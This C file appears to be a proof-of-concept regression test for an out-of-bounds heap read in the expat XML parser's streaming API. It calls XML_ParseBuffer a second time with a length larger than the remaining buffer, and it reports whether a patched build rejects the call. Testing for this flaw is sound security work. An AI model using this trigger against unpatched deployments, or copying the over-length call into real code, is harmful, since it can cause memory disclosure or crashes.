/* Residual OOB-read PoC for XML_ParseBuffer len validation.
 *
 * Drives the public streaming API (XML_GetBuffer + XML_ParseBuffer). A single
 * buffer of 2048 bytes is acquired and filled, then parsed. A second
 * XML_ParseBuffer call reuses the same (now exhausted) buffer with a len that
 * matches the originally requested size but exceeds the remaining capacity, so
 * the parser advances its read window past the end of the heap allocation.
 *
 * On a tree that validates len against the actual remaining buffer capacity the
 * second call is rejected with XML_ERROR_INVALID_ARGUMENT and no read occurs.
 */
#include <string.h>
#include <stdio.h>
#include "expat.h"

int
main(void) {
  const int reqSize = 2048;

  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL)
    return 2;

  char *buffer = (char *)XML_GetBuffer(parser, reqSize);
  if (buffer == NULL)
    return 2;

  /* Fill the whole acquired buffer with a start tag and character data. */
  memcpy(buffer, "<r>", 3);
  memset(buffer + 3, 'a', reqSize - 3);

  if (XML_ParseBuffer(parser, reqSize, XML_FALSE) != XML_STATUS_OK) {
    fprintf(stderr, "first parse failed unexpectedly\n");
    return 2;
  }

  /* The buffer is now full. A well-behaved caller would call XML_GetBuffer
   * again; here we parse another chunk the same size as the request. A tree
   * that bounds len by remaining capacity rejects this; otherwise the parser
   * reads past the allocation. */
  enum XML_Status status = XML_ParseBuffer(parser, reqSize, XML_FALSE);

  if (status == XML_STATUS_ERROR
      && XML_GetErrorCode(parser) == XML_ERROR_INVALID_ARGUMENT) {
    fprintf(stderr, "rejected: len validated against capacity (secure)\n");
    XML_ParserFree(parser);
    return 0;
  }

  XML_ParserFree(parser);
  return 0;
}
